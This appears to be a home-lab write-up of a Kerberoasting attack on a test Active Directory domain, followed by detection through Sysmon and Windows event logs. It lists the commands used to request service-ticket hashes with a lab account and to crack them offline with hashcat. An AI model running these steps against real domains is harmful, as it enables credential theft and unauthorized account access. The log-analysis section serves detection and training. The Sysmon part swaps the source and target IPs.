# Active Directory Attack Playbook (Kerberos-based SPN Extraction and Credential Compromise)

## **Overview**

- **Target:** Active Directory Domain Controller (within the soc.lab domain)
   - IP Address: 192.168.10.10
   - Domain: SOC.LAB
   - 
- **Attacker:** Kali 
   - IP Address: 192.168.20.30
## **Objective** 
The objective of this attack was to enumerate and extract Service Principal Names (SPNs) from the Active Directory environment and attempt to crack the Kerberos TGS hashes to gain unauthorized access to domain accounts.
Following the other attacks, we are already know the credentials from an User and the Active Directory Domain.

## Attack Execution Timeline:

- Checked that Kerberos (port 88) is open:
```bash
nc -vz 192.168.10.10 88
```
- Update the default DNS ip to point directly to the Domain Controller.

- Run GetUserSPNs.py from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
```bash
python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
```
Output:

![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)

- After that I cracked the Kerberos TGS Hash using hashcat with rockyou.txt, and saved on a cracked.txt file:
```bash
hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
```



## **Monitoring Windows Logs**

I started watching Sysmon Logs Analysis and identified multiple Event ID 3 entries in Sysmon logs, which makes it suspisious, knowing its coming from the same IP, and from external zone (DMZ): 

- All connections originated from IP 192.168.10.10, targeting 192.168.20.30.

- Different ephemeral ports were used, suggesting automated scanning or even communication.

![multipleSysmonlogs](https://github.com/user-attachments/assets/01ab753c-f8f0-42d1-8882-62f2a652937a)



** Windows Security Logs Analysis:

Event ID 4769 – Kerberos Service Ticket Request:

Found a large number of Event ID 4769 entries from the same source IP 192.168.10.10.

The requests were directed to various user accounts in the SOC.LAB domain.

This suggests the use of a Kerberoasting attack to extract Service Principal Names (SPNs).

Event ID 4634 – Logoff:

Immediately after the Kerberos ticket requests, there was an Event ID 4634.

User: SOC\labadmin

Logon Type: 3 (Network Logon – consistent with remote access).

This indicates a potential attacker logging off after completing ticket extraction.

Conclusion:
The log analysis confirms the execution of a Kerberoasting attack. The attacker, using IP 192.168.20.30, scanned the Domain Controller (192.168.10.10), extracted SPNs, and likely proceeded to crack the Kerberos TGS hashes offline. The sequence of Event IDs (1, 3, 4769, and 4634) aligns with common Kerberoasting techniques used for credential compromise.
